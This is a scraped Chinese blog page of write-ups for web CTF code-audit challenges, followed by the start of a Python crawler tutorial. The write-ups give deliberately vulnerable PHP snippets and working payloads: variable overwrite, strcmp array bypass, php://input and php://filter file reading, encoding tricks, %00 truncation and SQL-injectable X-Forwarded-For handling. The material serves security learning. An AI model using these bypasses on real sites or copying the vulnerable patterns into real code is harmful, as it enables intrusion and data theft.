<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//?name=test</span><br><span class="line"></span><br><span class="line">//output:string(4) “name” string(4) “test” string(4) “test” test</span><br><span class="line"></span><br><span class="line">$name=’thinking’;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line"></span><br><span class="line">$$key = $value;#$key=name,$$key=$name</span><br><span class="line"></span><br><span class="line">var_dump($key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump($value);</span><br><span class="line"></span><br><span class="line">var_dump($$key);</span><br><span class="line"></span><br><span class="line">echo $name;#会输出test</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>foreach函数将get参数存入数组，我们构造payload：<strong>index.php?name=meizijiu233</strong>，name作为变量存入，$$key=$name=meizijiu233；判断通过</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/变量覆盖/">变量覆盖</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-代码审计类ctf记录" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/09/代码审计类ctf记录/" class="article-date">
      <time datetime="2018-05-09T03:35:12.000Z" itemprop="datePublished">2018-05-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/09/代码审计类ctf记录/">代码审计类ctf记录</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h4 id="1-php-strcmp-漏洞"><a href="#1-php-strcmp-漏洞" class="headerlink" title="1.php strcmp()漏洞"></a>1.php strcmp()漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure>
<p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0<br>该漏洞是用于php5.3之前的版本<br>该函数要求是上传字符串进行比较，当我们传入非法参数时，如数组，在php5.3之前函数会报错，return 0！刚好和两个字符串相等返回0的结果一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$pass=@$_POST[&apos;pass&apos;];</span><br><span class="line">$pass1=***********;//被隐藏起来的密码</span><br><span class="line">if(isset($pass))</span><br><span class="line">&#123;</span><br><span class="line">if(@!strcmp($pass,$pass1))&#123;</span><br><span class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;the pass is wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;please input pass!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>payload:pass[]=1</p>
<h4 id="2-php-输入输出流"><a href="#2-php-输入输出流" class="headerlink" title="2.php://输入输出流"></a>2.php://输入输出流</h4><p>输入输出流主要包括三种：<br>php://input:直接读取post上没有经过解析的原始数据  </p>
<p>php://output：将post流数据输出  </p>
<p>php://filter：（常用在XXE漏洞中）文件操作协议，对磁盘文件进行读写，类似于readflie()、file()、flie_get_conments()  </p>
<p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fqa9q57w77j30ra08n3z7.jpg" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&apos;file&apos;];</span><br><span class="line">if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123;</span><br><span class="line">    echo $nctf;</span><br></pre></td></tr></table></figure></p>
<p>这道题要的是获取flie传入的文件，提取内容与meizijiu进行比较，我们可以利用php://input<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqa9y2go87j309s05o0sp.jpg" alt="image">  </p>
<h4 id="3-进制转换绕过"><a href="#3-进制转换绕过" class="headerlink" title="3.进制转换绕过"></a>3.进制转换绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">       $one = ord(&apos;1&apos;);</span><br><span class="line">       $nine = ord(&apos;9&apos;);</span><br><span class="line">       for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       return false;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          return $number == &apos;54975581388&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$flag=&apos;*******&apos;;</span><br><span class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</span><br><span class="line">   echo $flag;</span><br><span class="line">else </span><br><span class="line">   echo &apos;access denied&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码要的是get参数key的值与54975581388相等，但是每一位字符串的assic码要在0到9之外，这里我们可以将54975581388十六进制转码成0xccccccccc绕过</p>
<p>又一道题<br>源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">you are not the number of bugku !   </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
<p>这里要求传入是三个参数txt、file、password</p>
<ul>
<li>txt：txt参数传给了user变量，file_get_contents($user,’r’)===”welcome to the bugkuctf”，这里我们可以用到php输入流post传值  </li>
<li>flie：刚开始我以为因为是include（）函数我直接将file=hint.php就可以得出hint.php的值，这里没有考考虑到hint.php的路径问题，所以我们应该使用php://filter  </li>
<li>password：这里没有对passwor进行限制，可以随意处置<br>payload：?txt=php://input&amp;file=php://filter/content.base64-encode/resoursce=hint.php<br>post:welcome to the bugkuctf<br>得到一个base64的代码，解码得到</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我再次用PHP://filter读取flag.php，它告诉我不能现在就给我flag，后面就搞不懂了</p>
<h4 id="4-超全局变量"><a href="#4-超全局变量" class="headerlink" title="4.超全局变量"></a>4.超全局变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&apos;args&apos;]))&#123; #判断args参数是否存在</span><br><span class="line">    $args = $_GET[&apos;args&apos;];</span><br><span class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;#用正则判断看srgs变量中是否有字母及数字，有函数返回1，否0，所以这里让你只能输入字母和数字</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这道题的关键是var_dump函数输出变量的类型和内容，这里就要抠脑壳了，怎么知道flag在哪个变量<br>看书才发现可以使用$GLOBALS超全局数组调用系统中的所有变量和常量以及对象和对象中的属性变量值<br>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。<br>PHP在名为\$GLOBALS[index]的数组中存储了所有全局变量。变量的名字就是数组的键。<br>这样我们就给变量赋值args=GLOBALS，使变量为存储了所有变量的数字</p>
<h4 id="5-变量覆盖-php输入输出流"><a href="#5-变量覆盖-php输入输出流" class="headerlink" title="5.变量覆盖+php输入输出流"></a>5.变量覆盖+php输入输出流</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);#存在变量覆盖漏洞</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));#看到file_get_contents想到PHP://输入输出</span><br><span class="line">if($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;Oh.no&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因为这两种漏洞都写了，只是记住了一道题可以运用多种方法混合区解答<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqb9myprf9j309q056jrc.jpg" alt="image"><br>get传参利用了变量覆盖，将shiyan与content都赋值为0从而绕过，但是由于在覆盖变量之后，会给content重新赋值，所以看到了file_get_contents函数，想到了PHP输入流post传参，通过修改flag的值将content值进行修改  </p>
<h4 id="6-URLencode二次编码"><a href="#6-URLencode二次编码" class="headerlink" title="6.URLencode二次编码"></a>6.URLencode二次编码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先eregi函数在id参数中查找有没有hackerDJ字符，有则返回0，所以这里我们不能直接赋值hackerDJ，题目提示了二次编码，这里的get传参时已经进行了一次urldecode解码，后面又通过urldecode函数进行了二次解码，所以经过上面这些提示，就是对hackerDJ进行urlencode二次编码，传入参数就是hackerDJ，又到了抠脑壳的时候，为什么hackerDJ用工具编码后还是不变，看了人家的解答后才知道这种纯字符是不能用工具解码的，要对照编码表解码<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqbb0rgphnj30ad0mnwf2.jpg" alt="image"><br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fqbb1t901dj30h6015glf.jpg" alt="image">  </p>
<h4 id="7-数组返回NULL绕过or-00截断"><a href="#7-数组返回NULL绕过or-00截断" class="headerlink" title="7.数组返回NULL绕过or%00截断"></a>7.数组返回NULL绕过or%00截断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">echo &apos;You password must be alphanumeric&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>ereg函数查找password</p>
<h4 id="8-一道综合题"><a href="#8-一道综合题" class="headerlink" title="8.一道综合题"></a>8.一道综合题</h4><p>never never never give up！！！<br>这道题点开源码发现提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--1p.html--&gt;</span><br><span class="line">never never never give up !!!</span><br></pre></td></tr></table></figure>
<p>于是打开1p.html，但是发现重定向了，于是直接view-source:得到一串base64编码的代码 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==</span><br></pre></td></tr></table></figure>
<p>解码得  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里设置了三个get参数id、a、b，分别对应了三种不同的代码绕过机制  </p>
<ul>
<li>id：关于id的值id==0，并不是说是字符零，而是数字0，所以我们只需要给id赋值一个无数字字符串，无数字字符串在比较时会强制类型转换为数字0  </li>
<li>a：a必须为“bugku is a nice plateform!”首先一个stripos($a,’.’)函数，限制了a不能从外部引用文件，但又出现了file_get_contents，我们想到了input输入流的形式进行post传参</li>
<li>b：b的长度通过strlen($b)&gt;5限制为5以内，eregi(“111”.substr($b,0,1),”1114”)表示b中必须要有4，但是substr($b,0,1)!=4，所以我们想到了%00截断  </li>
</ul>
<p>构造payload：?id=@&amp;a=php://input&amp;b=%0044444 ,<br>post:bugku is a nice plateform!</p>
<h4 id="9-正则表达式匹配"><a href="#9-正则表达式匹配" class="headerlink" title="9.正则表达式匹配"></a>9.正则表达式匹配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这道题考察的是正则表达式的匹配  </p>
<blockquote>
<p>/key.<em>key.{4,7}key:\/.\/(.</em>key)[a-z][[:punct:]]/i  </p>
</blockquote>
<p>首先是一个字符串key，后面.表示匹配除/n之外的所有单字符，*表示前面的单字符重复0次或多次，.{4,7}又表示重复除/n以外的单字符4到7次，后面再跟字符串key:，这里\/将/转义，后面（.*key）就是单字符+key，[a-z]表示从中选一个字母，[[:punct:]]表示匹配标点符号<br>payload：?id=key.key…..key:/./.keya;</p>
<h4 id="10-INSERT-INTO注入"><a href="#10-INSERT-INTO注入" class="headerlink" title="10.INSERT INTO注入"></a>10.INSERT INTO注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);#没有报错回显</span><br><span class="line"></span><br><span class="line">function getIp()&#123;#获取真实ip</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;#先查看X-Forworded-For头是否设置，取其值</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);#将ip变量中的字符串以，为间隔打散成数组</span><br><span class="line">return $ip_arr[0];#所以后面构造sql语句时不能出现，</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);#链接数据库</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);#查询数据库</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot; ;#向client_ip表中插入变量ip的值  </span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-python-爬虫学习" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/03/25/python-爬虫学习/" class="article-date">
      <time datetime="2018-03-25T09:45:57.011Z" itemprop="datePublished">2018-03-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/25/python-爬虫学习/">python爬虫学习1</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol>
<li><p>最先肯定要复习一下正则不定式，当然还可以用XPath语言去替代正则    <a href="http://www.w3school.com.cn/xpath/" target="_blank" rel="noopener">教程</a><br><img src="http://ww2.sinaimg.cn/large/0060lm7Tly1fpp72zcmssj30m71br7wh.jpg" alt="image"></p>
</li>
<li><p>爬虫调度端：启动爬虫，停止爬虫，监视爬虫运行情况<br>URL管理器：对将要爬取的和已经爬取过的URL进行管理；可取出带爬取的URL，将其传送给“网页下载器”<br>网页下载器：将URL指定的网页下载，存储成一个字符串，在传送给“网页解析器”<br>网页解析器：解析网页可解析出①有价值的数据②另一方面，每个网页都包含有指向其他网页的URL，解析出来后可补充进“URL管理器”<br><img src="http://ww2.sinaimg.cn/large/0060lm7Tly1fpp7cbw9z7j30vx0gkdkr.jpg" alt="image"><br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7cs0ajqj30vv0i2gtv.jpg" alt="image"></p>
</li>
</ol>
<ol>
<li>URL管理器的实现方式有三种，一种是python内存中，利用set（）函数储存url<br>第二种是关联   第三种就是存放在缓存数据库中，如redis（这个不太明白 ）  <ol>
<li>常见的网页下载器，官方的是urllib2，在py3.x后被改为urllib.request，支持登录网页的cookies处理以及代理处理），使用from urllib import <h2 id="request添加模块"><a href="#request添加模块" class="headerlink" title="request添加模块"></a>request添加模块</h2></li>
</ol>
</li>
<li><p>基本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8  #当文件中有中文时，需要声明字符集  </span><br><span class="line">import urllib2  </span><br><span class="line">import cookielib  </span><br><span class="line">#引用urllib2、cookielib模块</span><br><span class="line">url=&apos;https://www.zhihu.com&apos;</span><br><span class="line">cj=cookielib.CookieJar()</span><br><span class="line">#将查询数据赋值给变量</span><br><span class="line">opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line">#向urllib2模块添加opener</span><br><span class="line">request=urllib2.Request(url)</span><br><span class="line">request.add_header(&apos;user-agent&apos;,&apos;Mozilla/5.0&apos;)</span><br><span class="line">response1=urllib2.urlopen(url)</span><br><span class="line">print response1.getcode()</span><br><span class="line">print cj</span><br><span class="line">print response1.read()</span><br></pre></td></tr></table></figure>
</li>
<li><p>基本的urlopen()函数不支持验证、cookie或其他HTTP高级功能。要支持这些功能，必须使用build_opener()函数来创建自己的自定义Opener对象  </p>
</li>
<li><p>网页解析器常用beatuifulsoup模块进行解析</p>
